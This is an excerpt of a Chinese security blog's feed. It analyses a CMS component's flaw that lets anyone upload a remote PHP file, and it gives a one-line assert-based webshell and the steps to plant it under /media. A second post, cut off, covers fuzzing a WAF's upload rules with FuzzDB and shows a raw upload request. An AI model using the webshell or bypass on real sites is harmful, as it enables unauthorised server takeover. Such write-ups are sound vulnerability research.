class=&quot;nv&quot;&gt;$info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Connection: close&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;feof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;stristr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'content-length'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 一直读取文件&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stristr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'content-length'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;nb&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 关闭连接 &lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$file_in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 这里再次读取，其实可以用file_get_contents...&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$file_out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 重新打开一个文件描述符，准备将文件写入服务器&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4056&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 读取 4056个字节并写入文件&lt;/span&gt;
			&lt;span class=&quot;nb&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JError&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;::&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;raiseError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JText&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;::&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Unable to open file '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;nb&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;.......&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面简单分析了一下代码，逻辑不是很难，主要是我不是很了解这个cms的框架，只能看个大概了。&lt;/p&gt;

&lt;h2 id=&quot;0x04-远程文件任意下载&quot;&gt;0x04 远程文件任意下载&lt;/h2&gt;

&lt;p&gt;上面分析了这么多，这个洞到底出现在哪里呢？&lt;/p&gt;

&lt;p&gt;其实主要就是未对文件扩展名进行校验，其实他们是有校验方法的，只是没有调用的不是时候：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_setMediaType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// is this audio, image, or not allowed?&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$media_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$path_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;extension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mediatypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;nv&quot;&gt;$mimetypes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mediatypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'extensions'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$extension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mimetypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;nv&quot;&gt;$media_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$media_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;media_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$media_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;/// print_r($this-&amp;gt;file_info);die;&lt;/span&gt;
		&lt;span class=&quot;nv&quot;&gt;$mediaTypeName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mediatypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$media_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mediaTypeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里是遍历了白名单扩展名，进行比较……&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x01.png&quot; alt=&quot;上传页面&quot; /&gt;&lt;/p&gt;

&lt;p&gt;利用上面的过程非常简单，只需要在URL Link中输入一个扩展名为PHP的远程文件，注意，它的代码必须是这样：&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php assert($_POST[&quot;test&quot;]);?&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;因为如果直接保存一句话木马，它还是会被我们的PHP环境解析，当然也可以将PHP的解析去掉 ~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x02.png&quot; alt=&quot;上传页面&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x03.png&quot; alt=&quot;上传页面&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在组件上提交这个URL：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x04.png&quot; alt=&quot;上传页面&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当文件上传上去以后，我们就可以在&lt;code class=&quot;highlighter-rouge&quot;&gt;/media&lt;/code&gt;文件夹下发现我们的文件了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-07/0x05.png&quot; alt=&quot;上传页面&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x05-总结&quot;&gt;0x05 总结&lt;/h2&gt;

&lt;p&gt;这个漏洞只是提及了一个简单的远程文件下载漏洞，而在Exploit-DB上披露的是直接上传文件漏洞。我认为可以刷一个CVE，但是没必要了，贵在学习&lt;/p&gt;

</description>
        <pubDate>Wed, 07 Feb 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-02-07/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-02-07/1</guid>
        
        
        <category>CVE漏洞分析</category>
        
      </item>
    
      <item>
        <title>Fuzzing With FuzzDB to Web Attack</title>
        <description>&lt;p&gt;本文介绍一个使用FUZZDB在Web环境下的测试方法
&lt;!--more--&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-前言&quot;&gt;0x01 前言&lt;/h2&gt;

&lt;p&gt;今天工作的时候帮同事验证一些漏洞，发现客户在扫描阶段结束后将WAF(Web Application FireWall)开启了，这就比较麻烦了。&lt;/p&gt;

&lt;p&gt;于是想到之前很久决定做的事情：使用FUZZDB来进行WAF的遗漏规则挖掘……&lt;/p&gt;

&lt;p&gt;去年五六月份在知乎写了几篇关于WAF的上传、注入，也分享过不少方法，但是没有一个系统的测试手法，原理没有做一个很清楚的总结，今天就来讨论一下。&lt;/p&gt;

&lt;h2 id=&quot;0x02-为什么要学习bypass&quot;&gt;0x02 为什么要学习ByPass&lt;/h2&gt;

&lt;p&gt;在安全圈里，很多基本简单的项目都是直接使用扫描器上去直接干，喝杯茶回来看结果，情况好的、感兴趣的，可能会用手工来试试。在Web渗透测试工程师的眼中：越红越感兴趣，权限越大越欢喜。当我们应对存在WAF的应用服务器的时候，好多人选择联系客户，让客户将防护暂时开启，使扫描器&lt;strong&gt;“大展神威”&lt;/strong&gt;……&lt;/p&gt;

&lt;p&gt;而关于FUZZ的技术在应用软件领域相对较为成熟，而且仅仅靠”OverFlow”就能挖掘许多bug、漏洞。&lt;/p&gt;

&lt;p&gt;在Web层面，很少有关于FUZZ成熟的方法，我也懒得造轮子。在这里举一些Web渗透中常规FUZZ相关的手段：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;目录扫描&lt;/li&gt;
  &lt;li&gt;口令枚举&lt;/li&gt;
  &lt;li&gt;爬虫&lt;/li&gt;
  &lt;li&gt;….&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其实都有一些相似。&lt;/p&gt;

&lt;p&gt;为了提高自己的能力，当然要与防御正对面的较量，有WAF是常有的事，当没有其他方式去达到目的只能选择规则对抗。&lt;/p&gt;

&lt;p&gt;如果你还不会Bypass，或者不理解Bypass的原理，你可能不是一个合格的渗透测试工程师……&lt;/p&gt;

&lt;h2 id=&quot;0x03-bypass的原理&quot;&gt;0x03 ByPass的原理&lt;/h2&gt;

&lt;p&gt;在这里我们构建一个概念模型：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-05/0x01.png&quot; alt=&quot;模型&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bypass就是寻找大于深绿区域的那块黑色内容&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;没有绝对安全的系统，当然防护是一样&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;通常情况下，我们的目的都是发送一些攻击且能够快速有效验证漏洞payload，但是这些常用的payload都被WAF加入了规则库中，如果遇到了规则库中存在的payload，WAF就要出来搞事情了，它会记录你的攻击数据，并且将到达Web服务器之前的数据给丢弃。如此一来，我们无法进行进一步的测试了，所以心情复杂、焦躁、甚至想哭唧唧。&lt;/p&gt;

&lt;h2 id=&quot;0x04-fuzzdb&quot;&gt;0x04 FuzzDB&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;GIT:https://github.com/fuzzdb-project/fuzzdb&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Github star 1800+&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;FuzzDB是为了通过动态应用程序安全性测试来增加引起和识别安全感兴趣条件的可能性。&lt;/p&gt;

&lt;p&gt;这是第一个也是最全面的故障注入模式的开放字典，可预测的资源位置，以及匹配服务器响应的正则表达式。&lt;/p&gt;

&lt;p&gt;这个项目很可观，包括了针对各种应用程序的测试payload，我经常使用它来去进行FUZZ模糊测试以及漏洞挖掘，平常收集的密码字典也会往里添加。它已经成为了我居家旅行不可或缺的字典库。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-02-05/0x02.png&quot; alt=&quot;工具&quot; /&gt;&lt;/p&gt;

&lt;p&gt;以下这些工具都有采用FUZZDB这个项目，只是大家没有发现：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OWASP Zap Proxy fuzzdb plugin https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project&lt;/li&gt;
  &lt;li&gt;SecLists https://github.com/danielmiessler/SecLists&lt;/li&gt;
  &lt;li&gt;TrustedSec Pentesters Framework https://github.com/trustedsec/ptf&lt;/li&gt;
  &lt;li&gt;Rapid7 Metasploit https://github.com/rapid7/metasploit-framework&lt;/li&gt;
  &lt;li&gt;Portswigger Burp Suite http://portswigger.net&lt;/li&gt;
  &lt;li&gt;Protofuzz https://github.com/trailofbits/protofuzz&lt;/li&gt;
  &lt;li&gt;BlackArch Linux https://www.blackarch.org/&lt;/li&gt;
  &lt;li&gt;ArchStrike Linux https://archstrike.org/&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x05-实战挖掘一个waf的缺漏规则---文件上传&quot;&gt;0x05 实战挖掘一个WAF的缺漏规则 - 文件上传&lt;/h2&gt;

&lt;p&gt;首先我们先将一个基本的文件上传数据包贴出来分析：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /upload_file.php HTTP/1.1
Host: 10.211.55.12
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://10.211.55.12/upload.html
X-Forwarded-For: 10.74.183.12
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=--------302761576
Content-Length: 502

----------302761576
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;
Content-Type: image/png

........

----------302761576
Content-Disposition: form-data; name=&quot;submit&quot;

Submit
----------302761576--
